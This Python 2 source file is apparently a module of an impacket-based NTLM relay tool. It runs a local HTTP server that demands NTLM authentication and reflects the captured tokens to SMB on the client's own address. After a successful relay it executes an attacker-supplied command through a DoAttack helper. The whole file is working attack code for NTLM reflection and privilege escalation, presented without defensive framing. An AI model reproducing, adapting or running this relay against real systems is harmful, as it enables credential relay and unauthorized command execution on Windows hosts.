# -*- coding: utf-8 -*-
import base64
import SocketServer
import SimpleHTTPServer
import threading

from struct import unpack
from impacket.nt_errors import STATUS_SUCCESS
from impacket.ntlm import NTLMAuthChallengeResponse, NTLMAuthChallenge
from impacket.spnego import SPNEGO_NegTokenResp

from .smbclient import SMBClient
from .attack import DoAttack
from .constant import constants


# class HTTPRelayServer(Thread):
class HTTPRelayServer():
    class HTTPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
        def __init__(self, server_address, RequestHandlerClass, command, target='127.0.0.1'):
            self.target = target
            self.command = command

            SocketServer.TCPServer.__init__(self, server_address, RequestHandlerClass)

    class HTTPHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

        def __init__(self, request, client_address, server):
            self.server = server
            self.protocol_version = 'HTTP/1.1'
            self.challengeMessage = None
            self.target = None
            self.client = None

            SimpleHTTPServer.SimpleHTTPRequestHandler.__init__(self, request, client_address, server)

        def handle_one_request(self):
            try:
                SimpleHTTPServer.SimpleHTTPRequestHandler.handle_one_request(self)
            except:
                pass

        def log_message(self, format, *args):
            return

        def do_AUTHHEAD(self, message=''):
            self.send_response(401)
            self.send_header('WWW-Authenticate', message)
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-Length', '0')
            self.end_headers()

        def do_HEAD(self):
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

        def do_GET(self):
            self.send_response(200)

        def do_OPTIONS(self):
            messageType = 0
            if self.headers.getheader('Authorization') is None:
                self.do_AUTHHEAD(message='NTLM')
                pass
            else:
                # constants.is_running = True
                typeX = self.headers.getheader('Authorization')
                try:
                    _, blob = typeX.split('NTLM')
                    token = base64.b64decode(blob.strip())
                except:
                    self.do_AUTHHEAD()
                messageType = unpack('<L', token[len('NTLMSSP\x00'):len('NTLMSSP\x00') + 4])[0]

            if messageType == 1:
                self.target = self.client_address[0]
                try:
                    self.client = SMBClient(self.target, extended_security=True)
                    self.client.set_timeout(60)
                except Exception as e:
                    print("Connection against target %s FAILED" % self.target)
                    print(str(e))

                clientChallengeMessage = self.client.sendNegotiate(token)
                self.challengeMessage = NTLMAuthChallenge()
                self.challengeMessage.fromString(clientChallengeMessage)
                self.do_AUTHHEAD(message='NTLM ' + base64.b64encode(clientChallengeMessage))

            elif messageType == 3:
                authenticateMessage = NTLMAuthChallengeResponse()
                authenticateMessage.fromString(token)

                respToken2 = SPNEGO_NegTokenResp()
                respToken2['ResponseToken'] = str(token)
                clientResponse, errorCode = self.client.sendAuth(self.challengeMessage['challenge'],
                                                                 respToken2.getData())

                if errorCode != STATUS_SUCCESS:
                    # print("[-] Authenticating against %s FAILED" % self.target)
                    self.do_AUTHHEAD('NTLM')
                    constants.authentication_succeed = False
                else:
                    # print("[+] Authentication SUCCEED")
                    constants.authentication_succeed = True

                    execute_cmd = DoAttack(self.client, self.server.command)
                    constants.output_cmd = execute_cmd.run()
                    constants.smb_client = self.client
                    # And answer 404 not found
                    self.send_response(404)
                    self.send_header('WWW-Authenticate', 'NTLM')
                    self.send_header('Content-type', 'text/html')
                    self.send_header('Content-Length', '0')
                    self.end_headers()

                self.server.server_close()
                self.server.shutdown()

    def __init__(self):
        self.command = None
        self.port = 8888  # the port is assigned randomly

    def run(self):
        self.httpd = self.HTTPServer(("127.0.0.1", self.port), self.HTTPHandler, self.command)
        self.httpd.serve_forever()


def runHTTPServer(port, service, command):
    s = HTTPRelayServer()
    s.port = port
    s.command = command

    # Run HTTP Server on a thread
    t1 = threading.Thread(target=s.run)
    t1.daemon = True
    t1.start()
